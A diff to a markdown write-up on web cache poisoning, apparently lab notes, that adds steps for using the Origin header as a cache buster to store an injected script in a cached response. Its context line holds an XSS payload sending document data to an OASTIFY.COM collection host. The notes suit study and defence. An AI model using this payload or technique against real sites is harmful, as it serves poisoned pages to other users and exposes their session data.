@@ -1120,9 +1120,26 @@ GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document
 ![cb1](images/cb2.png)
 
 >In this type of situations, headers like `Origin` can act as cache busters. They are part of the cache key, so every change on them would generate a miss on the cache key.
->So, if the query parameter is not part of the cache key and is reflected on the response, it means that we can use it in combination with the cache buster and then, delete it. Just like this:
+>So, if the query parameter is not part of the cache key and is reflected on the response, it means that we can use it in combination with the cache buster and then, delete it. For example, with this `Origin` header, paremeter `?cb=2` gets reflected in the servers response:
 
 ![cb1](images/cb_origin.png)
+
+>Prove that `Origin` is part of the cache key (modifying it will generate another cache key and therefore, a miss) and query parameter is not (modifying it will not produce anything): 
+
+![example](images/cb2_origin.png)
+
+>We can simply use another Origin server with a malicious parameter (to escape the JS). Cache will miss (because `Origin` header is part of the cache key and therefore, it is another request for the cache), generate another cache key, and inject payload in response:
+
+![example2](images/example2.png)
+![example2hit](images/hit_example2.png)
+
+>Then, any GET request (parameters dont affect as they are not part of cache key) to any path with the same `Origin` header will serve the cached response.
+
+![example3](images/example3.png)
+
+>Copying the request in Browsers Original Session will trigger an alert function
+
+![example3](images/alertFunc.png)
 
 ### Cloaking utm_content  
 
